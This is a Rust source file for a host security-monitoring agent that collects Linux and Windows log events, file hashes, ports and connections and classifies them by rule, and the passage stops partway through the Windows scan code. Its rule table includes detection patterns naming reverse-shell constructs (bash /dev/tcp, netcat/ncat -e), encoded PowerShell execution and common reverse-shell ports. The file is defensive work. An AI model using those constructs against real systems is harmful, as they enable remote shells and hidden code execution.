//! Security telemetry collection and threat detection ("Thanatos"): on
//! Linux, tails this host's security-relevant logs (auth/login, the
//! kernel ring buffer, and systemd unit failures); on Windows, queries
//! the Security and System event logs for an analogous set of signals
//! (failed/successful logons, account creation, privileged group
//! membership changes, service failures, unexpected shutdowns). Either
//! way, each line/event is classified against a fixed, ordered rule
//! table. Deliberately narrow compared to a full EDR/SIEM shipper -- no
//! continuous push telemetry, no eBPF/ETW, no log-file offset tracking.
//! The control plane pulls this on demand (or on its own periodic sweep,
//! see `crates/web/src/thanatos_ops.rs`) and does its own deduplication
//! by content hash, so re-scanning the same tail window repeatedly is
//! harmless, just slightly redundant -- a deliberate simplicity
//! trade-off consistent with every other arsenal in this codebase never
//! needing host-side state files.
//!
//! Output is tab-separated (`severity\tlabel\tsource\traw_line` for a
//! classified event, `fim\t<path>\t<hash>` for a file-integrity watch-list
//! entry, `info\t<message>` for anything else worth surfacing) rather
//! than free text: the control plane needs to parse and persist each
//! matched line as its own row for correlation to work, and `OperationOutput`
//! has no structured variant -- this is the same reasoning Reliquary's and
//! Inquest's listing operations already use `find -printf` tab-separated
//! output for. Identical on both platforms -- the control plane's ingest,
//! correlation, and UI code needs zero changes either way.

use std::net::IpAddr;

use abyssal_agent_protocol::{CommandOutcome, OperationOutput};

use crate::elevation::ElevationState;
#[cfg(unix)]
use crate::process::command_exists;

/// True for a private (RFC 1918), loopback, or link-local address --
/// shared by both platforms' outbound-connection gathering (Phase 8) to
/// filter out ordinary internal/local traffic before it's ever even
/// formatted, let alone classified. `Ipv4Addr::is_private`/`is_loopback`/
/// `is_link_local` are all stable std; IPv6 has no stable-std equivalent
/// for the private (`fc00::/7`, unique local) or link-local (`fe80::/10`)
/// ranges, so those two are checked by hand against the first 16 bits.
fn is_private_or_loopback(ip: &IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => v4.is_private() || v4.is_loopback() || v4.is_link_local(),
        IpAddr::V6(v6) => {
            v6.is_loopback()
                || (v6.segments()[0] & 0xfe00) == 0xfc00
                || (v6.segments()[0] & 0xffc0) == 0xfe80
        }
    }
}

#[cfg(unix)]
const TAIL_LINES: &str = "500";
#[cfg(unix)]
const JOURNAL_LINES: &str = "200";

/// `(path, source label)` -- tried in order; the first one that's a
/// readable, non-empty file wins. Debian/Ubuntu vs. RHEL/Fedora-family
/// naming, the two layouts flat security logs actually appear under.
#[cfg(unix)]
const LOG_CANDIDATES: &[(&str, &str)] = &[
    ("/var/log/auth.log", "auth.log"),
    ("/var/log/secure", "secure"),
];

/// Same "flat file first" shape as `LOG_CANDIDATES`, for the kernel ring
/// buffer -- `/var/log/kern.log` exists on Debian/Ubuntu by default (RHEL/
/// Fedora fold kernel messages into the journal instead, so there's no
/// equivalent flat-file candidate to add for that family). Independent of
/// the auth sources above: gathered and classified regardless of whether
/// auth.log/secure/journal turned up anything, since OOM-kills and
/// hardware errors are never auth-related.
#[cfg(unix)]
const KERNEL_LOG_CANDIDATES: &[(&str, &str)] = &[("/var/log/kern.log", "kern.log")];

/// Small, fixed set of security-sensitive files hashed on every scan --
/// lightweight file-integrity monitoring, not a general-purpose file
/// scanner. Always hashed regardless of whatever admin-configured
/// `extra_fim_paths` (Phase 7b) also arrive on a given scan -- this is
/// the baseline every host gets, not something an admin can accidentally
/// lose by clearing the configurable list. The agent stays stateless
/// either way; comparison against the last-known hash happens entirely
/// control-plane-side (`repo::thanatos_file_hashes`).
#[cfg(unix)]
const FIM_WATCHLIST: &[&str] = &[
    "/etc/passwd",
    "/etc/shadow",
    "/etc/sudoers",
    "/etc/ssh/sshd_config",
];

/// A journal source to fall back to when neither flat log candidate
/// above exists or is readable (e.g. a systemd-journal-only host with no
/// rsyslog forwarding configured). `sshd` and `systemd-logind` are real
/// systemd units (`journalctl -u`), but `sudo`/`su` are one-off child
/// processes, not services -- they have no unit at all, so `-u sudo`
/// silently returns nothing. Their PAM messages (including the
/// "authentication failure" line this arsenal's rules match on) are
/// tagged with the syslog identifier `sudo`/`su` instead, which needs
/// `journalctl -t`, a genuinely different flag.
#[cfg(unix)]
enum JournalSource {
    Unit(&'static str),
    Identifier(&'static str),
}

#[cfg(unix)]
const JOURNAL_SOURCES: &[JournalSource] = &[
    JournalSource::Unit("sshd"),
    JournalSource::Identifier("sudo"),
    JournalSource::Identifier("su"),
    JournalSource::Unit("systemd-logind"),
];

/// Windows Security-log event IDs Thanatos watches for (Phase 4 baseline
/// plus Phase 6's broader coverage): failed/successful logons, explicit-
/// credential logons (lateral movement/"runas"), privileged-logon use,
/// account/service/scheduled-task creation and privileged group
/// membership changes, audit-policy tampering, lockouts, and audit-log
/// clearing. 4688 (process creation) is deliberately not queried by ID
/// at all -- see the `RULES` doc comment below for why.
#[cfg(windows)]
const WINDOWS_SECURITY_EVENT_IDS: &[u32] = &[
    4624, 4625, 4648, 4672, 4697, 4698, 4699, 4700, 4701, 4702, 4719, 4720, 4732, 4740, 1102,
];

/// Windows System-log signals: repeated service-start failures/hangs and
/// an unexpected shutdown -- the closest analog available from the event
/// log alone to Linux's "systemd unit failed"/kernel-crash rules. Windows
/// has no OOM killer, so there's no direct analog to that specific rule;
/// 6008 (unexpected shutdown) is the nearest "something crashed hard"
/// signal.
#[cfg(windows)]
const WINDOWS_SYSTEM_EVENT_IDS: &[u32] = &[6008, 7000, 7009, 7011];

/// Additional log channels beyond Security/System (Phase 6b), each
/// populated only if the host's audit policy actually enables it --
/// same "best-effort, silently nothing if absent" caveat 4688 process-
/// creation auditing already carries. `Microsoft-Windows-PowerShell/
/// Operational` needs Script Block Logging turned on via policy (off by
/// default); `Microsoft-Windows-Windows Defender/Operational` is only
/// populated if Defender is the active AV (usually is, by default,
/// unless replaced by third-party AV). Sysmon-sourced events are
/// deliberately excluded -- Sysmon isn't installed by default on any
/// Windows edition, a materially bigger assumption than "this built-in
/// audit policy happens to be enabled," consistent with the "no eBPF"
/// line already drawn for Linux.
#[cfg(windows)]
const WINDOWS_EXTRA_CHANNELS: &[(&str, &str, &[u32])] = &[
    (
        "Microsoft-Windows-PowerShell/Operational",
        "powershell",
        &[4104],
    ),
    (
        "Microsoft-Windows-Windows Defender/Operational",
        "defender",
        &[1116, 5001],
    ),
];

/// One Windows FIM watch item: a stable identifier (used as the `path`
/// column in `thanatos_file_hashes` -- not necessarily a real filesystem
/// path, the registry/local-group entries below are synthetic
/// identifiers instead) plus the PowerShell expression that captures its
/// current content as text. Every item is hashed the same uniform way
/// (`windows_fim_hash_script`, below) regardless of whether the content
/// came from a file, the registry, or a group membership list -- unlike
/// Phase 4's single hosts-file item, which used `Get-FileHash` directly
/// since a file was the only kind of item that existed yet.
#[cfg(windows)]
struct WindowsFimItem {
    identifier: &'static str,
    capture_expr: &'static str,
}

/// Mirrors Linux's `FIM_WATCHLIST`, broadened in Phase 6 beyond the
/// single hosts-file item Phase 4 shipped. Windows has no single
/// flat-file analog to /etc/passwd or /etc/sudoers -- local account
/// state lives in the binary, normally-locked SAM database, not a
/// hashable text file -- so the other two items below are the closest
/// real equivalents instead: a machine-wide persistence location, and a
/// privileged-group membership snapshot.
#[cfg(windows)]
const WINDOWS_FIM_WATCHLIST: &[WindowsFimItem] = &[
    WindowsFimItem {
        identifier: r"C:\Windows\System32\drivers\etc\hosts",
        capture_expr: "(Get-Content -Raw -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -ErrorAction SilentlyContinue)",
    },
    // Deliberately HKLM only, not HKCU: the agent/service runs as
    // `LocalSystem`, whose own HKCU is a never-used-for-real-persistence
    // profile hive, not any interactively logged-in user's -- monitoring
    // a real user's HKCU\...\Run would need enumerating and loading
    // every other user profile's offline NTUSER.DAT hive under
    // HKEY_USERS, a substantially bigger and more fragile piece of work
    // than this pass's scope. Documented as a known gap, not silently
    // dropped. `Sort-Object` guards against registry enumeration order
    // not being a stable property to hash across scans the way whole-
    // file content is -- an unsorted hash risks a spurious "changed"
    // finding from nothing but reordering, not a real change.
    WindowsFimItem {
        identifier: r"HKLM\...\CurrentVersion\Run(Once)",
        capture_expr: "(@('HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', \
             'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce') | ForEach-Object { \
             $key = $_; Get-ItemProperty -Path $key -ErrorAction SilentlyContinue } | \
             ForEach-Object { $_.PSObject.Properties } | Where-Object { $_.Name -notmatch '^PS' } | \
             ForEach-Object { \"$($_.Name)=$($_.Value)\" } | Sort-Object)",
    },
    WindowsFimItem {
        identifier: "local-group:Administrators",
        capture_expr: "(Get-LocalGroupMember -Group 'Administrators' -ErrorAction SilentlyContinue | \
             Select-Object -ExpandProperty Name | Sort-Object)",
    },
];

/// Wraps a PowerShell expression that yields either a single string or
/// an array of strings, joins/hashes it in .NET directly (SHA-256, hex,
/// lowercased to match Linux's `sha256sum` convention), and prints just
/// the hash -- one uniform hashing step shared by every
/// `WindowsFimItem`, whatever kind of content it captures. Prints
/// nothing (not even an empty line) when the captured content is empty/
/// unavailable, so the caller can tell "nothing to hash" apart from "an
/// all-zero-length file" without a separate existence check.
#[cfg(windows)]
fn windows_fim_hash_script(capture_expr: &str) -> String {
    format!(
        "$content = {capture_expr}; \
         if ($content) {{ \
           $joined = ($content -join \"`n\"); \
           $bytes = [System.Text.Encoding]::UTF8.GetBytes($joined); \
           $hashBytes = [System.Security.Cryptography.SHA256]::Create().ComputeHash($bytes); \
           Write-Output ([System.BitConverter]::ToString($hashBytes).Replace('-', '').ToLower()) \
         }}"
    )
}

/// Ordered, first-match-wins classification rules: (substring, severity,
/// label). Order is load-bearing -- specific patterns before general ones,
/// e.g. "Failed password for invalid user" before the plain "Failed
/// password for", so an invalid-user attempt is never under-classified as
/// an ordinary failed login. `severity` is always `low`/`medium`/`high`
/// here -- `critical` is reserved for the control plane's own correlation
/// findings (see the `AgentOperation::ScanSecurityEvents` doc comment).
const RULES: &[(&str, &str, &str)] = &[
    (
        "Failed password for invalid user",
        "high",
        "SSH invalid-user login attempt",
    ),
    ("Failed password for", "medium", "SSH failed login"),
    (
        "Invalid user",
        "medium",
        "SSH login attempt for nonexistent user",
    ),
    (
        "Accepted publickey for",
        "low",
        "SSH successful login (key)",
    ),
    (
        "Accepted password for",
        "low",
        "SSH successful login (password)",
    ),
    (
        "session opened for user root",
        "high",
        "Root session opened",
    ),
    ("session opened for user", "low", "Session opened"),
    ("authentication failure", "high", "Authentication failure"),
    ("FAILED su", "high", "su authentication failure"),
    ("sudo:", "low", "Sudo activity"),
    ("password changed", "medium", "Password changed"),
    ("new group:", "medium", "Group created"),
    ("new user:", "medium", "User created"),
    (
        "Connection closed",
        "low",
        "SSH connection closed before authentication",
    ),
    ("segfault", "medium", "Process segfault"),
    ("New session", "low", "New login session"),
    // Kernel ring buffer (source "kern.log"/"kernel") and systemd unit
    // failures (source "systemd") -- added alongside the auth-oriented
    // rules above rather than in a separate table, since classification
    // is one global first-match-wins pass regardless of which source a
    // line came from.
    ("invoked oom-killer", "high", "OOM killer invoked"),
    (
        "Out of memory: Killed process",
        "high",
        "OOM killer invoked",
    ),
    (
        "Machine Check Event",
        "high",
        "Hardware machine-check event",
    ),
    ("I/O error", "medium", "Disk I/O error"),
    // `systemctl --failed`'s default column layout always repeats the
    // ACTIVE and SUB state back to back for a failed unit ("... loaded
    // failed failed ..."), a distinctive enough pair of words that it's
    // very unlikely to appear in an unrelated log line.
    ("failed failed", "medium", "systemd unit failed"),
    // ---- Process command-line signals (Phase 7). Matched against every
    // running process's own command line (source "process"), not a
    // process-list diff -- see `scan_security_events`'s own comment on
    // why. Deliberately a small, high-confidence set: constructs that
    // are essentially never legitimate rather than broad heuristics that
    // would false-positive on ordinary admin/scripting activity.
    (
        "/dev/tcp/",
        "high",
        "Possible reverse shell (bash /dev/tcp construct)",
    ),
    ("nc -e", "high", "Possible reverse shell (netcat -e)"),
    (
        "ncat --exec",
        "high",
        "Possible reverse shell (ncat --exec)",
    ),
    ("ncat -e", "high", "Possible reverse shell (ncat -e)"),
    // ---- Windows Security/System event log signals (Phase 4). Matched
    // on the `EventID=<n>` marker the Windows scan path embeds in each
    // line, never on the event's own message text: that text is
    // localized per the host's display language, so an English-wording
    // substring rule would silently stop matching on a non-English
    // host, while the numeric event ID is stable across every locale.
    // 4688 (process creation, audited only if the host's policy enables
    // it) is deliberately NOT classified by event ID at all -- on a host
    // where it's enabled it fires on every process launch, almost all
    // benign, and this arsenal only ever persists rows a rule actually
    // matched. Instead, only a command line containing a known
    // obfuscation/LOLBin pattern is flagged below, the same
    // "specific signal, not the whole category" approach
    // `segfault`/`invoked oom-killer` already take on the Linux side.
    ("EventID=4625", "high", "Windows failed logon"),
    ("EventID=4624", "low", "Windows successful logon"),
    ("EventID=4720", "medium", "Windows user account created"),
    (
        "EventID=4732",
        "high",
        "Windows account added to a security group",
    ),
    (
        "-EncodedCommand",
        "high",
        "Suspicious encoded PowerShell command",
    ),
    (
        "FromBase64String",
        "high",
        "Suspicious base64-decode-and-execute pattern",
    ),
    ("EventID=6008", "high", "Unexpected system shutdown"),
    ("EventID=7000", "medium", "Windows service failed to start"),
    ("EventID=7009", "medium", "Windows service failed to start"),
    ("EventID=7011", "medium", "Windows service control timeout"),
    // ---- Phase 6: broader Windows Security-log coverage, same
    // EventID-marker-matching reasoning as above. `-EncodedCommand`/
    // `FromBase64String` above already cover event 4104 (PowerShell
    // script block logging, `WINDOWS_EXTRA_CHANNELS`) for free -- a
    // logged script block containing either pattern matches the same
    // rule regardless of which log line it came from, so no separate
    // 4104 rule is needed.
    (
        "EventID=4648",
        "high",
        "Explicit-credential logon (possible lateral movement)",
    ),
    (
        "EventID=4672",
        "medium",
        "Privileged logon (admin/SYSTEM-level)",
    ),
    ("EventID=4697", "high", "Windows service installed"),
    ("EventID=4698", "medium", "Scheduled task created"),
    ("EventID=4699", "medium", "Scheduled task deleted"),
    ("EventID=4700", "medium", "Scheduled task enabled"),
    ("EventID=4701", "medium", "Scheduled task disabled"),
    ("EventID=4702", "medium", "Scheduled task updated"),
    (
        "EventID=4719",
        "high",
        "System audit policy changed (possible log tampering)",
    ),
    ("EventID=4740", "low", "Windows account locked out"),
    (
        "EventID=1102",
        "high",
        "Windows audit log was cleared (anti-forensics)",
    ),
    // Windows Defender (`WINDOWS_EXTRA_CHANNELS`) -- populated only if
    // Defender is the active AV.
    ("EventID=1116", "high", "Windows Defender detected malware"),
    (
        "EventID=5001",
        "high",
        "Windows Defender real-time protection disabled",
    ),
    // ---- Phase 8: established outbound connections to a remote port
    // long associated with reverse-shells/C2 (source "network-outbound",
    // both platforms). Matched on an exact `remote_port=<n>` marker --
    // never on "any unusual port," deliberately: outbound connections to
    // brand-new external IPs/ports are completely ordinary traffic (CDN
    // edges, load-balanced service pools), unlike a new *listening*
    // port, so this stays a short, high-confidence list rather than a
    // broad heuristic that would flag normal browsing/API traffic.
    // Private/loopback/link-local destinations are filtered out before
    // a line is ever formatted (`is_private_or_loopback`), so these only
    // ever match genuinely external connections.
    (
        "remote_port=4444",
        "high",
        "Outbound connection to a well-known reverse-shell port",
    ),
    (
        "remote_port=1337",
        "high",
        "Outbound connection to a well-known reverse-shell port",
    ),
    (
        "remote_port=31337",
        "high",
        "Outbound connection to a well-known reverse-shell port",
    ),
    (
        "remote_port=6666",
        "high",
        "Outbound connection to a well-known reverse-shell port",
    ),
    (
        "remote_port=6667",
        "high",
        "Outbound connection to a well-known reverse-shell port",
    ),
];

fn classify(line: &str) -> Option<(&'static str, &'static str)> {
    RULES
        .iter()
        .find(|(needle, _, _)| line.contains(needle))
        .map(|(_, severity, label)| (*severity, *label))
}

/// Extracts the port from a `ss`/`netstat` listing line's local-address
/// field (both put it at the same whitespace-split index once `netstat`'s
/// two-line header is filtered out by the caller) -- `rsplit(':')` rather
/// than `split(':')` so an IPv6 local address (`[::]:22`, itself
/// colon-heavy) still yields just the trailing port.
#[cfg(unix)]
fn parse_listening_port(line: &str, field_index: usize) -> Option<&str> {
    line.split_whitespace().nth(field_index)?.rsplit(':').next()
}

/// Current TCP/UDP listening ports, normalized to `"tcp:<port>"`/
/// `"udp:<port>"` (the same `port_key` shape the Windows implementation
/// below produces, so the control-plane baseline table doesn't need to
/// know which platform a key came from). Prefers `ss` (iproute2, present
/// on essentially every modern distro); falls back to `netstat` for
/// older systems, matching `firewall.rs`'s own "detect the tool present"
/// convention. Best-effort throughout -- a missing/failed tool just
/// means no port findings this scan, not a scan failure.
#[cfg(unix)]
async fn linux_listening_ports(elevation: &ElevationState) -> Vec<String> {
    let mut ports = Vec::new();
    if command_exists("ss").await {
        for (proto, flag) in [("tcp", "-tlnH"), ("udp", "-ulnH")] {
            if let Ok(output) = elevation.run_allow_failure("ss", &[flag]).await
                && output.exit_code == Some(0)
            {
                for line in output.stdout.lines() {
                    if let Some(port) = parse_listening_port(line, 3) {
                        ports.push(format!("{proto}:{port}"));
                    }
                }
            }
        }
    } else {
        for (proto, flag) in [("tcp", "-tln"), ("udp", "-uln")] {
            if let Ok(output) = elevation.run_allow_failure("netstat", &[flag]).await
                && output.exit_code == Some(0)
            {
                for line in output.stdout.lines() {
                    let starts_with_proto = line
                        .trim_start()
                        .get(..proto.len())
                        .is_some_and(|prefix| prefix.eq_ignore_ascii_case(proto));
                    if !starts_with_proto {
                        continue;
                    }
                    if let Some(port) = parse_listening_port(line, 3) {
                        ports.push(format!("{proto}:{port}"));
                    }
                }
            }
        }
    }
    ports.sort();
    ports.dedup();
    ports
}

/// Splits a `ss`/`netstat` remote-address field (`"203.0.113.9:4444"`,
/// or a bracketed IPv6 form like `"[2001:db8::1]:4444"`) into its
/// address and port, at the *last* colon so an unbracketed IPv6 address
/// (itself colon-heavy) still splits correctly. `field_index` is 4 for
/// both tools' established-connection output (`ss -tn state
/// established`'s Peer Address:Port column, and `netstat -tn`'s Foreign
/// Address column -- the same index Phase 7a's `parse_listening_port`
/// used for *local* address on a *listening*-socket line, since that's
/// a structurally different column position).
#[cfg(unix)]
fn parse_remote_addr_port(line: &str, field_index: usize) -> Option<(IpAddr, u16)> {
    let field = line.split_whitespace().nth(field_index)?;
    let port_start = field.rfind(':')?;
    let addr_str = field[..port_start]
        .trim_start_matches('[')
        .trim_end_matches(']');
    let ip: IpAddr = addr_str.parse().ok()?;
    let port: u16 = field[port_start + 1..].parse().ok()?;
    Some((ip, port))
}

#[cfg(unix)]
fn push_outbound_connection_line(lines: &mut Vec<String>, line: &str, field_index: usize) {
    if let Some((ip, port)) = parse_remote_addr_port(line, field_index)
        && !is_private_or_loopback(&ip)
    {
        lines.push(format!("remote_port={port}\tremote_addr={ip}\tproto=tcp"));
    }
}

/// Current established TCP connections to a *non-private, non-loopback*
/// remote address, formatted as `remote_port=<n>\tremote_addr=<ip>\t
/// proto=tcp` lines for `classify()` to match against (Phase 8) -- see
/// `RULES`' own doc comment for why this is a `classify()` source and
/// not a baseline-diff table the way listening ports are. Same "prefer
/// `ss`, fall back to `netstat`" shape as `linux_listening_ports`.
#[cfg(unix)]
async fn linux_outbound_connections(elevation: &ElevationState) -> Vec<String> {
    let mut lines = Vec::new();
    if command_exists("ss").await {
        if let Ok(output) = elevation
            .run_allow_failure("ss", &["-tn", "-H", "state", "established"])
            .await
            && output.exit_code == Some(0)
        {
            for line in output.stdout.lines() {
                push_outbound_connection_line(&mut lines, line, 4);
            }
        }
    } else if let Ok(output) = elevation.run_allow_failure("netstat", &["-tn"]).await
        && output.exit_code == Some(0)
    {
        for line in output.stdout.lines() {
            let lower = line.trim_start().to_ascii_lowercase();
            if !lower.starts_with("tcp") || !lower.contains("established") {
                continue;
            }
            push_outbound_connection_line(&mut lines, line, 4);
        }
    }
    lines
}

/// Currently loaded kernel module names (Phase 9), from `lsmod`'s first
/// whitespace column of every line after its own header row. A newly-
/// loaded module a scan-to-scan comparison hasn't seen before is exactly
/// the kind of rootkit/kernel-level-persistence signal a healthy host's
/// naturally stable module set makes low-noise to alert on -- unlike
/// Phase 8's outbound connections, this genuinely is a baseline-diff
/// case, the same shape as `linux_listening_ports`'s own set-membership
/// tracking (see `thanatos_kernel_module_baseline`'s doc comment
/// control-plane-side for the reconciliation logic).
#[cfg(unix)]
async fn linux_kernel_modules(elevation: &ElevationState) -> Vec<String> {
    let mut modules = Vec::new();
    if let Ok(output) = elevation.run_allow_failure("lsmod", &[]).await
        && output.exit_code == Some(0)
    {
        for line in output.stdout.lines().skip(1) {
            if let Some(name) = line.split_whitespace().next() {
                modules.push(name.to_string());
            }
        }
    }
    modules
}

#[cfg(unix)]
pub async fn scan_security_events(
    elevation: &ElevationState,
    extra_fim_paths: Vec<String>,
) -> CommandOutcome {
    let mut lines_with_source: Vec<(&'static str, String)> = Vec::new();

    // ---- Auth/login sources: a flat log file, or journalctl only if
    // neither flat candidate was readable at all. ----
    let mut auth_found = false;
    for (path, source) in LOG_CANDIDATES {
        match elevation
            .run_allow_failure("tail", &["-n", TAIL_LINES, path])
            .await
        {
            Ok(output) if output.exit_code == Some(0) && !output.stdout.trim().is_empty() => {
                auth_found = true;
                for line in output.stdout.lines() {
                    lines_with_source.push((source, line.to_string()));
                }
            }
            _ => {}
        }
    }

    if !auth_found && command_exists("journalctl").await {
        for source in JOURNAL_SOURCES {
            let (flag, value) = match source {
                JournalSource::Unit(u) => ("-u", *u),
                JournalSource::Identifier(i) => ("-t", *i),
            };
            match elevation
                .run_allow_failure(
                    "journalctl",
                    &[flag, value, "-n", JOURNAL_LINES, "--no-pager", "-o", "cat"],
                )
                .await
            {
                Ok(output) if output.exit_code == Some(0) => {
                    for line in output.stdout.lines() {
                        if !line.trim().is_empty() {
                            lines_with_source.push(("journal", line.to_string()));
                        }
                    }
                }
                _ => {}
            }
        }
    }

    // ---- Kernel ring buffer: independent of the auth sources above --
    // OOM-kills/hardware errors/segfault bursts aren't auth-related, so
    // this is gathered regardless of whether `auth_found` came up empty.
    // Same "flat file first, journal/dmesg fallback" shape. A permission
    // failure here (e.g. `kernel.dmesg_restrict=1` and no elevation)
    // still returns `Ok` with the error text as stdout -- harmless, since
    // `classify` below only ever emits lines that actually match a rule,
    // never surfaces raw command output verbatim the way a read-only
    // display arsenal does.
    let mut kernel_found = false;
    for (path, source) in KERNEL_LOG_CANDIDATES {
        match elevation
            .run_allow_failure("tail", &["-n", TAIL_LINES, path])
            .await
        {
            Ok(output) if output.exit_code == Some(0) && !output.stdout.trim().is_empty() => {
                kernel_found = true;
                for line in output.stdout.lines() {
                    lines_with_source.push((source, line.to_string()));
                }
            }
            _ => {}
        }
    }
    if !kernel_found {
        let kernel_output = if command_exists("journalctl").await {
            elevation
                .run_allow_failure(
                    "journalctl",
                    &["-k", "-n", JOURNAL_LINES, "--no-pager", "-o", "cat"],
                )
                .await
        } else {
            elevation.run_allow_failure("dmesg", &["-T"]).await
        };
        if let Ok(output) = kernel_output
            && output.exit_code == Some(0)
        {
            for line in output.stdout.lines() {
                if !line.trim().is_empty() {
                    lines_with_source.push(("kernel", line.to_string()));
                }
            }
        }
    }

    // ---- systemd unit failures: independent of everything above. ----
    if command_exists("systemctl").await
        && let Ok(output) = elevation
            .run_allow_failure("systemctl", &["--failed", "--no-pager", "--no-legend"])
            .await
        && output.exit_code == Some(0)
    {
        for line in output.stdout.lines() {
            if !line.trim().is_empty() {
                lines_with_source.push(("systemd", line.to_string()));
            }
        }
    }

    // ---- Process command lines: independent of everything above --
    // fed through the same classify() pass as every log source (source
    // "process"), not diffed -- see `RULES`'s "Process command-line
    // signals" comment for why. `-eo args` (not `-ef --forest`, which
    // Reanimation's own process listing uses) keeps each line to just
    // the command itself, no tree-drawing characters or extra columns
    // to pollute substring matching.
    if let Ok(output) = elevation
        .run_allow_failure("ps", &["-eo", "args", "--no-headers"])
        .await
        && output.exit_code == Some(0)
    {
        for line in output.stdout.lines() {
            if !line.trim().is_empty() {
                lines_with_source.push(("process", line.to_string()));
            }
        }
    }

    // ---- Established outbound connections to a non-private remote
    // address: independent of everything above -- see
    // `linux_outbound_connections`'s and `RULES`' own doc comments.
    for line in linux_outbound_connections(elevation).await {
        lines_with_source.push(("network-outbound", line));
    }

    let scanned = lines_with_source.len();
    let mut stdout = String::new();
    let mut matched_count = 0usize;
    for (source, line) in &lines_with_source {
        if let Some((severity, label)) = classify(line) {
            matched_count += 1;
            stdout.push_str(&format!("{severity}\t{label}\t{source}\t{line}\n"));
        }
    }

    // File-integrity watch-list -- always attempted, independent of
    // whether any log source above was readable at all (hashing a file
    // has nothing to do with log availability). `extra_fim_paths`
    // (Phase 7b) are admin-configured, additive to -- never a
    // replacement for -- the fixed watch-list above; re-validated here
    // even though the control plane already checked them, same "never
    // trusts a wire value" rule every other operation follows.
    let extra_fim_paths: Vec<&str> = extra_fim_paths
        .iter()
        .map(String::as_str)
        .filter(|p| abyssal_agent_protocol::is_valid_absolute_path(p))
        .collect();
    for path in FIM_WATCHLIST.iter().copied().chain(extra_fim_paths) {
        if let Ok(output) = elevation.run_allow_failure("sha256sum", &[path]).await
            && output.exit_code == Some(0)
            && let Some(hash) = output.stdout.split_whitespace().next()
        {
            stdout.push_str(&format!("fim\t{path}\t{hash}\n"));
        }
    }

    // Listening ports -- always attempted, reported fresh every scan
    // (the control plane does the new-port diffing, same "stateless
    // agent" split FIM already uses; see `thanatos_network_baseline`'s
    // doc comment control-plane-side).
    for port_key in linux_listening_ports(elevation).await {
        stdout.push_str(&format!("port\t{port_key}\n"));
    }

    // Loaded kernel modules -- same "agent reports the full current
    // set, control plane diffs it" split as listening ports; see
    // `linux_kernel_modules`'s own doc comment.
    for module_key in linux_kernel_modules(elevation).await {
        stdout.push_str(&format!("module\t{module_key}\n"));
    }

    if matched_count == 0 {
        let note = if scanned == 0 {
            "No readable security log sources found (checked /var/log/auth.log, \
             /var/log/secure, journalctl for sshd/sudo/systemd-logind, the kernel ring \
             buffer, and systemd unit status)."
                .to_string()
        } else {
            format!("Scanned {scanned} line(s); nothing matched the current detection rules.")
        };
        stdout.push_str(&format!("info\t{note}\n"));
    }

    CommandOutcome::Ok(OperationOutput {
        stdout,
        stderr: String::new(),
        exit_code: Some(0),
    })
}

/// Windows equivalent of the Unix `scan_security_events` above -- same
/// wire format, same classify()/RULES pass, different gathering. Reads
/// via `Get-WinEvent` (shelled out through `powershell.exe`) rather than
/// the raw Win32 EventLog API: this agent has no Windows machine in its
/// own test/CI loop to verify unsafe FFI against, and every other
/// platform-specific data source in this crate already goes through a
/// CLI tool and text parsing rather than a native API, so this keeps
/// that same, independently-verifiable shape. `_elevation` is unused --
/// unlike Linux's sudo-gated reads, the service always runs as
/// `LocalSystem` (see `crates/agent/src/winservice.rs`), which already
/// has full Event Log read access.
#[cfg(windows)]
pub async fn scan_security_events(
    _elevation: &ElevationState,
    extra_fim_paths: Vec<String>,
) -> CommandOutcome {
    let mut lines_with_source: Vec<(&'static str, String)> = Vec::new();

    let mut channels: Vec<(&str, &str, &[u32])> = vec![
        ("Security", "security", WINDOWS_SECURITY_EVENT_IDS),
        ("System", "system", WINDOWS_SYSTEM_EVENT_IDS),
    ];
    channels.extend(
        WINDOWS_EXTRA_CHANNELS
            .iter()
            .map(|(log_name, source, ids)| (*log_name, *source, *ids)),
    );

    for (log_name, source, ids) in channels {
        let id_list = ids.iter().map(u32::to_string).collect::<Vec<_>>().join(",");
        // `-replace '\r?\n', ' '` flattens the (often multi-line)
        // Message property to one line, since the outer wire format is
        // itself newline-delimited; the 300-char cap keeps a handful of
        // very long templates from dwarfing everything else in the
        // scan's output. `EventID=$($_.Id)` is prepended as a stable,
        // non-localized marker `classify()` matches on -- see the
        // `RULES` doc comment for why matching on the message text
        // itself would be unreliable.
        let script = format!(
            "Get-WinEvent -FilterHashtable @{{LogName='{log_name}';Id={id_list}}} \
             -MaxEvents 200 -ErrorAction SilentlyContinue | ForEach-Object {{ \
             $m = ($_.Message -replace '\\r?\\n', ' ').Trim(); \
             if ($m.Length -gt 300) {{ $m = $m.Substring(0, 300) }}; \
             \"EventID=$($_.Id)`tTime=$($_.TimeCreated.ToString('o'))`t$m\" }}"
        );
        if let Ok(output) = crate::process::run_command(
            "powershell.exe",
            &["-NoProfile", "-NonInteractive", "-Command", &script],
        )
        .await
        {
            for line in output.stdout.lines() {
                if !line.trim().is_empty() {
                    lines_with_source.push((source, line.to_string()));
                }
            }
        }
    }

    // Process command lines -- fed through the same classify() pass as
    // every event-log source (source "process"), not diffed. Plain
    // `Get-Process` doesn't expose a command line; `Win32_Process` does.
    let process_script = "Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | \
         Select-Object -ExpandProperty CommandLine";
    if let Ok(output) = crate::process::run_command(
        "powershell.exe",
        &["-NoProfile", "-NonInteractive", "-Command", process_script],
    )
    .await
    {
        for line in output.stdout.lines() {
            if !line.trim().is_empty() {
                lines_with_source.push(("process", line.to_string()));
            }
        }
    }

    // Established outbound connections to a non-private remote address
    // -- see `RULES`' own doc comment for why this is a classify()
    // source, not a baseline-diff table. `-ErrorAction SilentlyContinue`
    // per-cmdlet since a `-State Established` filter finding nothing is
    // completely normal, not a failure worth surfacing. The private/
    // loopback filter runs agent-side (`is_private_or_loopback`, shared
    // with the Linux path) rather than in PowerShell, so both platforms
    // use the exact same range logic.
    let outbound_script = "Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | \
         ForEach-Object { \"$($_.RemoteAddress)`t$($_.RemotePort)\" }";
    if let Ok(output) = crate::process::run_command(
        "powershell.exe",
        &["-NoProfile", "-NonInteractive", "-Command", outbound_script],
    )
    .await
    {
        for line in output.stdout.lines() {
            let mut parts = line.splitn(2, '\t');
            if let (Some(addr_str), Some(port_str)) = (parts.next(), parts.next())
                && let Ok(ip) = addr_str.trim().parse::<IpAddr>()
